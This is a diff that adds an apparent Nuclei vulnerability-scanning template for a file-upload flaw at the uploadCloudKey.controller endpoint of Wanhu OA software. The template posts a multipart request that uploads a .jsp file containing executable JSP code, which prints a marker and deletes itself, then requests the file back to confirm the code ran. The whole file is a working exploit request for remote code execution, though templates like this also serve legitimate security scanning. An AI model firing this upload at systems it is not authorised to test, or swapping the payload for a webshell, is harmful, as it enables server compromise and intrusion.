@@ -1,0 +1,49 @@
+id: wanhu-uploadCloudKey-uploadfile
+
+info:
+  name: wanhu-uploadCloudKey-uploadfile
+  author: CCC
+  severity: high
+
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/cloudplatform/uploadCloudKey.controller HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        Connection: close
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file1"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+        Content-Type: text/plain
+
+        <%out.println("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------{{boundary}}--
+
+      - |
+        GET /defaultroot/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
+
+      - |
+        GET /defaultroot/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
+
+    stop-at-first-match: true
+    extractors:
+      - type: dsl
+        name: only_for_sleep
+        dsl:
+          - wait_for(3)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"{{randstr}}")
